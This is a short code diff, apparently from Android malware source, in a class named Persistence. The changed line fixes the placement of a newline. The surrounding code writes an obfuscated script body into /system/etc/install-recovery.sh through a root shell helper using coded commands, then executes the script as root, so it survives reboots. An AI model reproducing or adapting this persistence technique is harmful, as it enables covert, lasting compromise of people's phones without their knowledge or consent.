@@ -110,7 +110,7 @@ public class Persistence {
 		script = M.e("#!/system/bin/sh") + "\n";
 		//script += Configuration.shellFile + " " + "qzx" + " " + "\"touch "+  M.e(" /system/etc/install-recovery.sh") +"\""+ "\n";
 		//script += Configuration.shellFile + " " + "pzm" + " 755 "+  M.e(" /system/etc/install-recovery.sh")+ "\n";
-		script += Configuration.shellFile + " " + "ape" + " " + "\"" + scriptBody + "\"" + M.e(" /system/etc/install-recovery.sh"+ "\n");
+		script += Configuration.shellFile + " " + "ape" + " " + "\"" + scriptBody + "\"" + M.e(" /system/etc/install-recovery.sh")+ "\n";
 		
 		Root.createScript(scriptName, script);
 		Execute.executeRoot(Status.getAppContext().getFilesDir().getAbsolutePath() + "/" + scriptName);
